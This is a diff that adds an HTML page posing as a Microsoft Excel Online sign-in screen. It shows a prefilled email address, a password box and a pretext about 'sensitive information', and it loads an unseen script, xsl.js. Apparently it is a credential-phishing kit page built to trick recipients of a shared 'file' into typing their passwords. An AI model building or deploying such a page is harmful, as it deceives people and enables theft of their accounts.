@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="favicon.jpg" type="image/x-icon">
+    <link rel="stylesheet" href="xls.css">
+    <title>Excel - Online</title>
+</head>
+<body>
+
+<main></main>
+
+<section id="xsl_container">
+
+    <div id="loading_content">
+        <img src="logo.png" alt="XLS">
+        <p>
+            <i>. . .</i>
+        </p>
+    </div>
+
+    <form id="xsl_form" method="get">
+        <div class="xsl_logos">
+            <img src="logo.png" alt="Excel">
+            <span>Microsoft Excel</span>
+        </div>
+
+        <div class="xsl_mail">
+            <img src="arrow.svg" alt="go back">
+            <input type="text" readonly value="example@yahoo.com" placeholder="Enter email address" id="mail_input">
+        </div>
+
+        <h1>Enter password</h1>
+
+        <p id="notifier">
+            Because you're accessing sensitive information, you need to verify your password
+        </p>
+
+        <div class="xsl_pass">
+            <input type="search" id="pass_input" placeholder="Password">
+        </div>
+
+        <div class="xsl_link">
+            <a href="#">
+                <b>Note:</b>
+                <span>
+                    Only the above email receipient can access this file
+                </span>
+            </a>
+        </div>
+
+        <div class="xls_btn">
+            <button id="sub_btn">Sign in</button>
+        </div>
+        <input type="hidden" id="temp_mail">
+    </form>
+</section>
+    
+</body>
+<script src="xsl.js"></script>
+</html>
